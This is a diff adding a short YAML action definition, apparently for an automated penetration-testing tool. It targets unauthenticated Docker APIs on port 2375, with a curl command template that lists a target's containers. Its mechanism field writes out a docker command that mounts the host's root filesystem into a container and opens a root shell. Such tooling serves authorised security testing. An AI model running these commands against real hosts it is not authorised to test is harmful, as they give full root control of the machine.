@@ -1,0 +1,16 @@
+name: docker_api
+category: services
+description: Docker API exploitation (unauthenticated)
+preconditions:
+  - service.port==2375
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s 'http://{target_ip}:2375/containers/json'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Unauthenticated Docker API = root on host. Create container with host root mounted: docker -H tcp://target:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh."
